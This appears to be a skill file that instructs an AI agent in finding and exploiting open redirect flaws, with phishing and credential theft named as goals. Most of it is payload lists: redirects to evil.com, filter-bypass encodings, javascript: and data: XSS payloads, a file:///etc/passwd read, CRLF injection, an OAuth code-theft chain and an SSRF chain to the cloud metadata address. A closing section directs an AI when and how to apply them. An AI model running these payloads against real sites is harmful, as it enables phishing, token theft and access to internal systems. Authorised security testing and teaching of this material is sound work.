# Open Redirect Skill

## Goal

Identify and exploit open redirect vulnerabilities for phishing or chained attacks.

## Methodology

1. **Find Redirect Parameters:** Look for URL, return, next, redirect parameters
2. **Test External Redirect:** Try redirecting to attacker-controlled domain
3. **Bypass Validation:** Evade URL validation filters
4. **Chain Attacks:** Combine with SSRF, OAuth attacks, or XSS
5. **Phishing:** Use for credential theft via trusted domain

## Common Parameters

```
?url=, ?redirect=, ?return=, ?returnUrl=, ?next=
?goto=, ?destination=, ?redir=, ?redirect_uri=
?continue=, ?return_path=, ?success=, ?checkout_url=
?image_url=, ?r=, ?u=, ?link=, ?returnTo=
```

## Basic Payloads

```bash
# Direct external redirect
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com

# Protocol variation
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\/\/evil.com
```

## Bypass Techniques

### Whitelisted Domain Bypass
```bash
# Subdomain of attacker
?url=https://target.com.evil.com
?url=https://evil.target.com

# Path as domain
?url=https://target.com@evil.com
?url=https://evil.com#target.com
?url=https://evil.com?target.com

# Backslash confusion
?url=https://target.com\@evil.com
?url=https://evil.com\target.com
```

### Encoding Bypass
```bash
# URL encoding
?url=https://evil%2Ecom
?url=https://%65%76%69%6C%2E%63%6F%6D

# Double encoding
?url=https://%252f%252fevil.com

# Unicode
?url=https://evil。com  # Fullwidth period
```

### Protocol Bypass
```bash
# For javascript execution
?url=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>
?url=vbscript:msgbox(1)

# Alternative protocols
?url=file:///etc/passwd
```

### Path Manipulation
```bash
# CRLF injection
?url=https://evil.com%0d%0aLocation:%20https://target.com

# Path confusion
?url=/\evil.com
?url=////evil.com
```

## Chain with OAuth

```bash
# Steal OAuth code via redirect_uri open redirect
1. Find open redirect: /redirect?url=FUZZ
2. Use in OAuth flow:
   /authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://evil.com

# Attacker receives authorization code
```

## Chain with SSRF

```bash
# Use open redirect to bypass SSRF filters
# SSRF filter allows target.com
# Use: https://target.com/redirect?url=http://internal-server

POST /fetch
{"url": "https://target.com/redirect?url=http://169.254.169.254/metadata"}
```

## Tools

* **Burp Suite** - Parameter discovery and testing
* **Open Redirect Scanner** - Automated detection
* **ParamSpider** - Find redirect parameters

## Guidance for AI

* Activate when testing redirect functionality or OAuth/SSO flows
* Check for open redirect in login, logout, and auth flows
* Try various bypass techniques for filtered inputs
* Can be chained with OAuth for token theft
* JavaScript: protocol can elevate to XSS
* Lower severity alone, but valuable in chains
* Test both GET and POST based redirects
